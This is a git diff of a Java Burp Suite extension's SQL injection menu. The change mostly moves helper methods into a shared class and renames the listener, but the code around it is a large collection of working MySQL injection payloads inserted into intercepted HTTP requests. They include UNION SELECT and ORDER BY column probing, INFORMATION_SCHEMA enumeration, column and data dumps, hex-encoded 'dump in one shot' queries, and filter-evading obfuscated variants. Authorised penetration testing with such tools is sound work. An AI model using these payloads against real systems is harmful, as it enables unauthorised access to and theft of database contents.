@@ -46,35 +46,15 @@ public class SQL_Menu extends JMenu{
         this.Create_SQL_Menu();
     }
     
-    public JMenu add_MenuItem_and_listener(JMenu menu, String[] itemList){
-        for(int i = 0; i < itemList.length; i++){
-            JMenuItem item = new JMenuItem(itemList[i]);
-            item.addActionListener(new MenuItemListener(myburp));
-            menu.add(item);
-        }
-        return menu;
-    }
-    
     public void Create_SQL_Menu(){
-        for(int i=0; i < SQL_MenuItem.length; i++){
-            JMenu menu = new JMenu(SQL_MenuItem[i]);
-            menu = add_MenuItem_and_listener(menu, SQL_MenuItems[i]);
-            if(SQL_MenuItem[i].equals("Basic Statements")){
-                this.add(new JSeparator());
-                this.add(menu);
-                this.add(new JSeparator());
-            }else{
-                this.add(menu);
-            }
-            
-        }
+        Methods.Create_Main_Menu(this, SQL_MenuItem, SQL_MenuItems, new SQLMenuItemListener(myburp));
     }
 }
 
-class MenuItemListener implements ActionListener {
+class SQLMenuItemListener implements ActionListener {
 
     BurpExtender myburp;
-    MenuItemListener(BurpExtender burp) {
+    SQLMenuItemListener(BurpExtender burp) {
         myburp = burp;
     }
     
@@ -89,23 +69,6 @@ class MenuItemListener implements ActionListener {
         String action = e.getActionCommand();
         byte[] newRequest = do_sql_op(request, selectString, action, selectedIndex);
         req.setRequest(newRequest);
-    }
-    
-    public byte[] do_modify_request(byte[] request, int[] selectedIndex, String modifiedString){
-        byte[] modString = modifiedString.getBytes();
-        byte[] newRequest = new byte[request.length + modifiedString.length() - (selectedIndex[1]-selectedIndex[0])];
-        System.arraycopy(request, 0, newRequest, 0, selectedIndex[0]);
-        System.arraycopy(modString, 0, newRequest, selectedIndex[0], modString.length);
-        System.arraycopy(request, selectedIndex[1], newRequest, selectedIndex[0]+modString.length, request.length-selectedIndex[1]);
-        return newRequest;
-    }
-    
-    public String prompt_and_validate_input(String prompt, String str){
-        String user_input = JOptionPane.showInputDialog(prompt, str);
-        while(user_input.trim().equals("")){
-            user_input = JOptionPane.showInputDialog(prompt, str);
-        }
-        return user_input.trim();
     }
     
     public String creat_number_list(int count, String str, String str2){
@@ -130,11 +93,11 @@ class MenuItemListener implements ActionListener {
         String tmp = null;
         switch(action){
             case "Order By":
-                columns = prompt_and_validate_input("Enter No. of Columns", null);
+                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                 selectedString = "+Order+By+" + columns + "+";
                 break;
             case "Group By":
-                columns = prompt_and_validate_input("Enter No of Columns", null);
+                columns = Methods.prompt_and_validate_input("Enter No of Columns", null);
                 tmp = creat_number_list(Integer.valueOf(columns), null, null);
                 selectedString = "+GROUP+BY" +  tmp + "+";
                 break;
@@ -142,27 +105,27 @@ class MenuItemListener implements ActionListener {
                 selectedString = "+PROCEDURE+ANALYSE()+";
                 break;
             case "Union Select":
-                columns = prompt_and_validate_input("Enter No. of Columns", null);
+                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                 tmp = creat_number_list(Integer.valueOf(columns), null, null);
                 selectedString = "+Union+Select" + tmp + "+";
                 break;
             case "Union All Select (int)":
-                columns = prompt_and_validate_input("Enter No. of Columns", null);
+                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                 tmp = creat_number_list(Integer.valueOf(columns), null, null);
                 selectedString = "+Union+ALL+Select" + tmp + "+";
                 break;
             case "Union All Select(null)":
-                columns = prompt_and_validate_input("Enter No. of Columns", null);
+                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                 tmp = creat_number_list(Integer.valueOf(columns), "NULL", null);
                 selectedString = "+Union+ALL+Select" + tmp + "+";
                 break;
             case "(INT),(INT)":
-                columns = prompt_and_validate_input("Enter No. of Columns", null);
+                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                 tmp = creat_number_list(Integer.valueOf(columns), null, "()");
                 selectedString = "+Union(Select" + tmp + ")+";
                 break;
             case "(NULL),(NULL)":
-                columns = prompt_and_validate_input("Enter No. of Columns", null);
+                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                 tmp = creat_number_list(Integer.valueOf(columns), "NULL", "()");
                 selectedString = "+Union(Select" + tmp + ")+";
                 break;
@@ -185,7 +148,7 @@ class MenuItemListener implements ActionListener {
                 selectedString = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)";
                 break;
             case "Table Group Concat":
-                database = prompt_and_validate_input("Enter Database Name", "DATABASE()");
+                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                 database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));
                 selectedString = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=" + database + ")";
                 break;
@@ -193,26 +156,26 @@ class MenuItemListener implements ActionListener {
                 selectedString = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)";
                 break;
             case "Column Group Concat":
-                table = prompt_and_validate_input("Enter Table Name", null);
+                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                 table = "0x" + String.format("%x", new BigInteger(1, table.getBytes()));
                 selectedString = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=" + table + ")";
                 break;
             case "Column One Shot":
-                table = prompt_and_validate_input("Enter Table Name", null);
+                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                 table = "0x" + String.format("%x", new BigInteger(1, table.getBytes()));
                 selectedString = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=" + table + ")AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)";
                 break;
             case "Data Group Concat":
-                database = prompt_and_validate_input("Enter Database Name", "DATABASE()");
-                table = prompt_and_validate_input("Enter Table Name", null);
-                columns = prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
+                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
+                table = Methods.prompt_and_validate_input("Enter Table Name", null);
+                columns = Methods.prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
                 if (!database.toLowerCase().equals("database()")){ table = database+"."+table;}
                 selectedString = "(SELECT+GROUP_CONCAT(" + columns + "+SEPARATOR+0x3c62723e)+FROM+" + table + ")";
                 break;
             case "Data One Shot":
-                database = prompt_and_validate_input("Enter Database Name", "DATABASE()");
-                table = prompt_and_validate_input("Enter Table Name", null);
-                columns = prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
+                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
+                table = Methods.prompt_and_validate_input("Enter Table Name", null);
+                columns = Methods.prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
                 if (!database.toLowerCase().equals("database()")){ table = database+"."+table;}
                 selectedString = "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(" + table + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + columns + ",0x3c62723e))))x)";
                 break;
@@ -220,7 +183,7 @@ class MenuItemListener implements ActionListener {
                 selectedString = "+concat(0x3c64697620616c69676e3d226c65667422207374796c653d22666f6e742d66616d696c793a20436f6d69632053616e73204d53223e3c68313e44494f53204279206d616b6d616e3c2f68313e,user(),0x3c62723e,version(),@x:='',@y:='',@schname:='',@tbl:='',0x0a,if(benchmark((select+count(*)from+information_schema.schemata+where+schema_name!='information_schema'),@x:=concat(@x,0x0a0a,@y:='',(select+concat(0x3c68723e,repeat(0x2d,length(schema_name)),0x3c62723e,@schname:=schema_name,0x3c62723e,repeat(0x2d,length(schema_name)),if((select+count(*)from+information_schema.columns+where+table_schema=schema_name+and+@y:=concat(@y,0x0a,if(@tbl!=table_name,concat(0x3c62723e2d2d3e20,@tbl:=table_name,0x3a3a,(select+table_rows+from+information_schema.tables+where+table_schema=schema_name+and+table_name=@tbl+limit+1)),concat(0x2a,column_name)))),'',''),@y)from+information_schema.schemata+where+schema_name!='information_schema'+and+schema_name+>+@schname+order+by+schema_name+ASC+limit+1))),'',''),0x0a,@x)+as+makman+";
                 break;
             case "DIOS by makman v2":
-                database = prompt_and_validate_input("Enter Database Name", "DATABASE()");
+                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                 if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                 selectedString = "(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema=" + database + ")and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.columns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)";
                 break;
@@ -249,12 +212,12 @@ class MenuItemListener implements ActionListener {
                 selectedString = "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)";
                 break;
             case "DIOS by Ajkaro":
-                database = prompt_and_validate_input("Enter Database Name", "DATABASE()");
+                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                 if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                 selectedString = "(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=" + database + ")and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)";
                 break;
             case "DIOS by AkDK":
-                database = prompt_and_validate_input("Enter Database Name", "DATABASE()");
+                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                 if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                 selectedString = "concat/***/(0x223e3c2f7461626c653e3c2f6469763e3c2f613e3c666f6e7420636f6c6f723d677265656e3e3c62723e3c62723e3c62723e,0x3c666f6e7420666163653d63616d62726961207374796c653d726567756c61722073697a653d3320636f6c6f723d7265643e7e7e7e7e7e3a3a3a3a3a496e6a6563746564206279416c69204b68616e3a3a3a3a3a7e7e7e7e7e3c62723e3c666f6e7420636f6c6f723d626c75653e2056657273696f6e203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,version(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e204461746162617365203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,database(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e2055736572203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,user(),0x3c62723e3c666f6e7420636f6c6f723d7265643e205461626c657320203c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e436f6c756d6e733c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e,@:=0,%28Select+count(*)from%28information_Schema.columns)where(table_schema=" + database + ")and@:=concat/**/(@,0x3c6c693e,0x3c666f6e7420636f6c6f723d7265643e,table_name,0x3c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a2020203c666f6e7420636f6c6f723d677265656e3e,column_name,0x3c2f666f6e743e)),@,0x3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e)";
                 break;
@@ -295,6 +258,6 @@ class MenuItemListener implements ActionListener {
                 selectedString = selectedString;
                 
         }
-        return do_modify_request(request, selectedIndex, selectedString);
+        return Methods.do_modify_request(request, selectedIndex, selectedString);
     }
 }
